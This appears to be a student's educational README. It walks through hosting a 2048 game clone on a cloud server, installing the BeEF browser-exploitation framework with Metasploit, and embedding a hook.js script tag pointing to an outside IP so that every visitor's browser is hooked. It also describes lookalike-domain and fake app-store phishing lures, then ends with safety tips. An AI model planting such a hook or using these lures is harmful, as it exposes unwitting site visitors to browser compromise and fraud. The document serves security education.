# Fake-Game-Website-Attack (project)
This is documentation on a fake game website attack for simulation and educational purposes. i will be documenting each step. To learn more about the hacker mindset and ways to avoid these attacks

For this i will be using a clone of the popular phone game 2048 (https://2048.ninja/)

The repository used for this exercise is (https://github.com/atilsamancioglu/2048.git)

I first used Digital Ocean as the platform to create a ubuntu server to run the website off of.

<img width="1437" height="977" alt="Screenshot 2025-08-26 135344" src="https://github.com/user-attachments/assets/bc9d6c16-4766-413e-a97e-9a23790a046f" />

Then ran all neccessary updates and installed the apache2 service. 

Then for the exploit im using beef framework (https://github.com/beefproject/beef.git)

To run Beef on an ubuntu server i first needed to install:

RVM (https://github.com/rvm/rvm.git)

install RVM, update it and install the requirements for RVM

<img width="1219" height="131" alt="Screenshot 2025-08-26 160520" src="https://github.com/user-attachments/assets/c98c79fb-2ab4-4a05-8254-99b227b19dc9" />


Once done then, instal the lastest version of ruby. (https://www.ruby-lang.org/en/documentation/installation/#apt)

After you have updated to the latest version of ruby you can now install beef.

BEEF (https://github.com/beefproject/beef.git)

once installed you can go to the config.yaml file:

<img width="1505" height="204" alt="Screenshot 2025-08-26 161044" src="https://github.com/user-attachments/assets/7b2a8759-bc77-4177-88a9-6ff1e58f98c4" />


Inside the file you can change the username and password for beef:

<img width="2540" height="1131" alt="Screenshot 2025-08-26 161237" src="https://github.com/user-attachments/assets/669e255d-3d88-4352-87be-5db6cb078922" />

BUT, more importantly we can configure the setting to allow metasploit and social engineering to be used within BEEF.

<img width="2536" height="1129" alt="Screenshot 2025-08-26 161331" src="https://github.com/user-attachments/assets/6f4929ac-5748-409a-a292-2928ab8a840e" />

Then, update-beef 

Afterwards cd into the extensions directory:


<img width="1505" height="204" alt="Screenshot 2025-08-26 161044" src="https://github.com/user-attachments/assets/76cd7986-6e39-498d-b101-af43d78244bd" />


<img width="1340" height="142" alt="Screenshot 2025-08-26 162039" src="https://github.com/user-attachments/assets/5582cad1-b844-4ff3-9b0b-6fa71aa8beda" />

cd, into the metasploit directory, thenano into the config.yaml file


<img width="2530" height="1068" alt="Screenshot 2025-08-26 162501" src="https://github.com/user-attachments/assets/f4a37f47-ddcb-47cd-8974-952fac17ad6a" />

In the Config.yaml file there are three things to do
1. Change the Host from your VM to your server IP
2. Change the callback Host to your server IP
3. Create a custom path at the bottom '/usr/share/metasploit-framework/'

Then Run Beef:

<img width="1634" height="954" alt="Screenshot 2025-08-26 163826" src="https://github.com/user-attachments/assets/ee7143d3-574b-409c-aceb-29ed0964ab86" />

Make your way to /var/www/html

<img width="1506" height="405" alt="Screenshot 2025-08-26 164632" src="https://github.com/user-attachments/assets/9fe7cebf-2e27-4b9e-bb4c-08941d367caf" />

nano into the index.html file


<img width="1508" height="144" alt="Screenshot 2025-08-26 164856" src="https://github.com/user-attachments/assets/aaf151f9-7b38-4e1f-bdda-5b31b75e4743" />


Scroll down to the bottom add your beef hook link everyones is different as an embedded javascript

<img width="1524" height="798" alt="Screenshot 2025-08-26 165244" src="https://github.com/user-attachments/assets/d92811a9-7dc2-486b-a910-b9304b36c1ba" />


<script src="http://209.38.16.144:3000/hook.js></script>

Once the script is added this allows us to "HOOK" anyone who visits the website opening them to exploits to be executed on our end.

The website looks like this and seems innocent:

<img width="2543" height="1334" alt="Screenshot 2025-08-26 170229" src="https://github.com/user-attachments/assets/43c75a58-a91f-4338-8391-6ffdcd242acb" />

but after they have loaded into the website we get a near instant connection to the victem.


<img width="1056" height="490" alt="Screenshot 2025-08-26 at 5 04 42 PM" src="https://github.com/user-attachments/assets/ee0a1422-a264-4cdc-a461-8a4a068abefd" />

<img width="937" height="491" alt="Screenshot 2025-08-26 at 5 07 00 PM" src="https://github.com/user-attachments/assets/8b28191d-2559-40d8-9e7a-48e7238b8351" />

from here we can go into the beef framework and deploy payloads and exploit to our benefit.

This however isn't enough because people wouldn't typically click on a random link that is just an IP address so hackers would go online and buy a domain address like playforfree.com or 2048freeplaynow.com
something that is simluar to the game to make it look less suspicious.

or they could embed the link of the server to a image of the game and send something like "PLAY NOW! can you reach 2048?" with an image and link that looks like it would go to the app store to download 
would forward them to the wbsite.

How to stay safe?

First would be not to accept to go to any websites from phishy looking people
second would be to check the source code of the site and if you scroll down to here we embedded the hook file and you see some version of it present then you know that your trying to be hacked.
in addition try to stay away from any http websites there completely unsecure and https should be the default. if paranoid you can configure your browser setting to not run any java script 
though this will make your website visting less visually pleasing.





